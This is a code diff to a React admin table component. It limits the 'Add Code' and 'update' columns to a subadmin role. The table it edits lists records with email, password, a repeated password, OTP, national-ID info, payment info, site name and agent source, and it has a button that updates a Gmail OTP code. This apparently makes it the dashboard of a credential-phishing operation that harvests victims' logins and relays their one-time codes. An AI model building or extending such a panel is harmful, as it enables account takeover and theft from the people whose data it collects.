@@ -29,6 +29,8 @@ const InformationTable = () => {
     toast.success('code sent sucessfully')
   }
 
+
+
   const { loading, setIsRefresh, displayInfo, role,totalPages, setPage,page} = useInformation()
 
   return (
@@ -96,13 +98,28 @@ const InformationTable = () => {
                  </th>
                 )
               }
-                            <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
-                Add Code  
-              </th>
-              <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
-                update
-              </th>
 
+          
+
+              {
+  role==='subadmin' && (
+    <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
+    Add Code  
+  </th>
+    
+  )
+}
+
+{
+   role === 'subadmin' &&(
+    <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
+    update
+  </th>
+
+   )
+}
+           
+            
 
               <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
                 Agent
@@ -119,7 +136,7 @@ const InformationTable = () => {
 
           <tbody className='text-center'>
             {
-              displayInfo?.map(({ user,nidInfo,  createdAt, agent: { source }, mailCode, email, password, repassword, otp, siteName, _id,paymentInfo, }:any,index) => (
+              displayInfo?.map(({ user,nidInfo,  createdAt, agent: { source },  email, password, repassword, otp, siteName, _id,paymentInfo, }:any,index) => (
                 <tr key={_id} className=" ">
                   <th scope="row" className="px-2 py-1 font-bold cursor-pointer text-gray-900 whitespace-nowrap dark:text-white ">
                     {index + 1}
@@ -184,18 +201,30 @@ const InformationTable = () => {
                     )
                   }
                 
-                <td className="px-2 py-1 font-bold cursor-pointer ">
-                             <input type="text" className="py-2 w-12 border-none dark:bg-graydark focus:outline-none  bg-bodydark1" onChange={(e)=>setCodeVal(e.target.value)} />
-                      </td>
-                      <td className="px-2 py-1 font-bold cursor-pointer ">
-                        <div className="relative inline-block">
-                          <button
-                          onClick={()=>updateGmailOtp(_id)}
+                {
+                  role ==='subadmin' && (
+                    <td className="px-2 py-1 font-bold cursor-pointer ">
+                    <input type="text" className="py-2 w-12 border-none dark:bg-graydark focus:outline-none  bg-bodydark1" onChange={(e)=>setCodeVal(e.target.value)} />
+             </td>
+                  )
+                }
+             
+                      
 
-                            className={`p-2 ${index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
-                              }`}>Add</button>
-                        </div>
-                      </td>
+                      {
+                        role === 'subadmin' && (
+                          <td className="px-2 py-1 font-bold cursor-pointer ">
+                          <div className="relative inline-block">
+                            <button
+                            onClick={()=>updateGmailOtp(_id)}
+  
+                              className={`p-2 ${index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
+                                }`}>Add</button>
+                          </div>
+                        </td>
+                        )
+                      }
+                     
 
                   <td className="px-2 py-1 font-bold cursor-pointer ">
                     <div className="relative inline-block">
